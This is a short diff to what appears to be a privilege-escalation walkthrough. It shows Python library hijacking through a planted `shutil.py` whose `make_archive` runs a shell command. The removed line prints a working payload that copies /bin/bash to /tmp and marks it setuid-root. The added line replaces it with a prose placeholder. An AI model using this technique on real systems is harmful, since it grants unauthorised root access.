@@ -154,7 +154,7 @@ So write a `shutil.py` in a directory you own, give it a `make_archive` that doe
 # /var/tmp/shutil.py
 import os
 def make_archive(a, b, c):
-    os.system('cp /bin/bash /tmp/iceberg; chmod 6755 /tmp/iceberg')
+    os.system("[ copy /bin/bash to /tmp/iceberg and mark the copy setuid-root ]")
 ```
 
 Then run the blessed script with your pantry wired to the front.
